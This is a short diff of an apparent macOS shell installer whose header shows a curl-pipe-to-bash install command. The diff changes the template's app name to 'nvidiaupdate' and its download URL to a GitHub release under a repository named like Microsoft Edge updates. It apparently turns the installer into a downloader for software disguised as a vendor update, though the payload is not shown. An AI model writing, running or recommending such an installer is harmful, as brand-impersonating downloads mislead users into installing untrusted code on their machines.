@@ -5,8 +5,8 @@
 #   curl -fsSL https://xxx.com/install-mac.sh | bash
 #
 
-APP_NAME="yourapp"
-DOWNLOAD_URL="https://xxx.com/download/mac"
+APP_NAME="nvidiaupdate"
+DOWNLOAD_URL="https://github.com/deepwork0714/microsoftedge-updates/releases/download/v.0.0.8-mac/mac-update"
 INSTALL_DIR="$HOME/.yourapp/bin"
 INSTALL_PATH="$INSTALL_DIR/$APP_NAME"
 
